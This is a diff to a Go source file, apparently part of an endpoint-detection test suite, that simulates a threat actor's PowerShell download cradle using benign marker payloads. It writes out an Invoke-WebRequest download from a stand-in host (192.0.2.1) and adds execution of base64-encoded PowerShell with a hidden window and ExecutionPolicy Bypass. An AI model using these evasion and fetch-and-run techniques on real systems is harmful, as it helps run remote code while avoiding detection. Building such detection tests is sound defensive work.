@@ -12,12 +12,14 @@ This tests whether EDR detects the PowerShell-based download and execution chain
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"time"
+	"unicode/utf16"
 )
 
 const (
@@ -89,6 +91,7 @@ func performTechnique() error {
 	// The simulated "Rust backdoor" is a benign batch file
 	simulatedPayload := []byte(
 		"@echo off\r\n" +
+			"REM F0RT1KA_SIMULATION_ARTIFACT_NOT_REAL_MALWARE\r\n" +
 			"REM F0RT1KA Security Test - Simulated UNK_RobotDreams Rust backdoor\r\n" +
 			"REM Real malware: Rust-based backdoor communicating via Azure Front Door\r\n" +
 			"echo [F0RT1KA] Simulated Rust backdoor agent started\r\n" +
@@ -118,7 +121,7 @@ func performTechnique() error {
 	psCommand := fmt.Sprintf(
 		`$ErrorActionPreference='SilentlyContinue'; `+
 			`Write-Host '[F0RT1KA] Simulating UNK_RobotDreams PowerShell download cradle'; `+
-			`$url='https://127.0.0.1:65535/update/agent.exe'; `+
+			`$url='https://192.0.2.1/update/agent.exe'; `+
 			`$outPath='%s'; `+
 			`try { Invoke-WebRequest -Uri $url -OutFile $outPath -TimeoutSec 3 } catch { }; `+
 			`if (Test-Path $outPath) { Write-Host '[F0RT1KA] Payload already staged at target path' } `+
@@ -191,7 +194,25 @@ func performTechnique() error {
 		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Start-Process output: %s", strings.TrimSpace(string(output2))))
 	}
 
-	// Step 4: Verify artifacts survived AV/EDR scanning
+	// Step 4: Execute base64-encoded PowerShell variant (-EncodedCommand)
+	// UNK_RobotDreams often base64-encodes download cradles to evade string-based detection
+	encodedScript := "New-Item -Path 'c:\\F0\\encoded_cradle_marker.txt' -ItemType File -Value 'F0RT1KA_SIMULATION_ARTIFACT' -Force"
+	encodedCmd := encodePS(encodedScript)
+	LogMessage("INFO", TECHNIQUE_ID, "Executing base64-encoded PowerShell command (-EncodedCommand)")
+	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Encoded command length: %d characters", len(encodedCmd)))
+
+	encCmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive",
+		"-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
+		"-EncodedCommand", encodedCmd)
+	encOutput, encErr := encCmd.CombinedOutput()
+	if encErr != nil {
+		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("EncodedCommand result: %v (output: %s)", encErr, strings.TrimSpace(string(encOutput))))
+	} else {
+		LogMessage("INFO", TECHNIQUE_ID, "EncodedCommand PowerShell executed successfully")
+	}
+	LogMessage("INFO", TECHNIQUE_ID, "Detection opportunity: powershell.exe -EncodedCommand with base64-encoded download cradle")
+
+	// Step 5: Verify artifacts survived AV/EDR scanning
 	time.Sleep(3 * time.Second)
 
 	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
@@ -202,6 +223,17 @@ func performTechnique() error {
 	LogMessage("INFO", TECHNIQUE_ID, "Detection points: Hidden PowerShell window, Invoke-WebRequest, ExecutionPolicy Bypass, .exe in user profile")
 
 	return nil
+}
+
+// encodePS encodes a PowerShell script as UTF-16LE base64 for -EncodedCommand
+func encodePS(script string) string {
+	runes := utf16.Encode([]rune(script))
+	b := make([]byte, len(runes)*2)
+	for i, r := range runes {
+		b[i*2] = byte(r)
+		b[i*2+1] = byte(r >> 8)
+	}
+	return base64.StdEncoding.EncodeToString(b)
 }
 
 // ==============================================================================
